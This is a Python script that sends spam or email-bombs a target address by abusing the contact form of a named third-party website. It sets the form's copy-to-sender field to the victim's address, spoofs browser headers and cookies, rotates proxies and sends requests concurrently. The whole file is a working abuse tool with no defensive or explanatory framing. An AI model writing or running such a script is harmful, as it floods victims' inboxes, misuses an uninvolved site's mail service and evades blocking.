from os.path import basename

import requests

from module import Spam

cookies = {
    '_ga': 'GA1.3.517769678.1677676833',
    '_gid': 'GA1.3.2007628456.1677676833',
    '_gat': '1',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    # 'Cookie': '_ga=GA1.3.517769678.1677676833; _gid=GA1.3.2007628456.1677676833; _gat=1',
    'Origin': 'http://www.porridgeandrice.co.uk',
    'Pragma': 'no-cache',
    'Referer': 'http://www.porridgeandrice.co.uk/contact.php',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}

s = 'Thank you'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        text = self.get_text(False)
        data = {
            'email_subject': 'text',
            'email_body': text,
            'return_email': target,
            'copy_me': '1',
        }

        response = requests.post('http://www.porridgeandrice.co.uk/contact_form.php', cookies=cookies, headers=headers,
                                 data=data, proxies=self.get_proxies())
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
